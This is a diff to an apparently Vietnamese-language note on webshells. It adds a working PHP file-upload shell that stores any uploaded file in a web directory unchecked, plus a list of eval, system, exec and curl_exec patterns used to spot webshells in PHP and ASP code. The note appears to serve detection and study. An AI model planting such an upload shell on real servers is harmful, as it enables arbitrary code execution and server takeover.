@@ -53,7 +53,6 @@ if (isset($_POST['cmd'])) {
     </form>
 </body>
 </html>
-
 ```
 
 2. Http Tunnel
@@ -65,3 +64,47 @@ if (isset($_POST['cmd'])) {
 ```
 
 4. Upload shell
+
+```
+<?php
+if($_SERVER['REQUEST_METHOD'] === 'POST'){
+    $targetDir = 'upload';
+    $targetFile = $targetDir . basename($_FILES['userfile']['name']);
+
+    if(move_uploaded_file($_FILES['userfile']['tmp_name'], $targetFile)){
+        header("Location: $targetFile");
+        exit;
+    }
+}
+?>
+<form enctype="multipart/form-data" action="" method="POST">
+    <input type="hidden" name="MAX_FILE_SIZE" value="100000">
+    Send this file: <input name="userfile" type="file">
+    <input type="submit" value="Send">
+</form>
+```
+
+# Các pattern
+
+1. File PHP
+- eval(): webshell eval thực thi lệnh do hacker truyền vào qua các biến trong request. Ví dụ <?php eval($_GET('a')); ?>.
+    - eval($_GET('string')); eval($_POST('string')); eval($_REQUEST('string'))
+    - eval(encode string)
+    - eval('response = '+response+';').
+    - eval('$string = '.$string. ';').
+    - eval($filter) (bắt từ chuỗi simpleEval($filter)).
+    - 'Eval(&$item, &$dataType)', 'Eval($item[$key], $dataType)', 'Eval($value)','Eval($filters, $dataType)'
+- $recursive0($params, $level+1)', '$recursive0($params)'
+- exec ('sassc -t compressed -I '.$cwd.$bootstrapPath.' -I '.$cwd.portal()
+- System()
+    - system('/u01/colombo/usr/bin/php -c /u01/colombo/etc/php.ini /u01/colombo/www/crontab/runService.php 59721 Education.CourseResult.Exam.autoMarkExamAll')
+    - system("perl ./api/syslog-send.pl \"Syslog filter for ".$fil["mf_log"]." updated by".read_session('SesAccount')."\"");
+- curl_exec($ch)
+- exec("ifconfig | grep -Eo 'inet (addr:)'
+- $class(sfContext::getInstance()
+2. Trường hợp file aspx, asp, cs
+- eval() Thực thi lệnh truyền vào từ request. Dữ liệu được lấy từ request bằng cách Request.Item['a']
+    - eval("DATE_DEBIT")
+    - eval(Container.DataItem, "CategoryName")
+    - eval("CreatTime", "{0:dd/MM/yyyy (HH:mm:ss),
+    - eval("AMT_PAY","{0:#,##0}")  
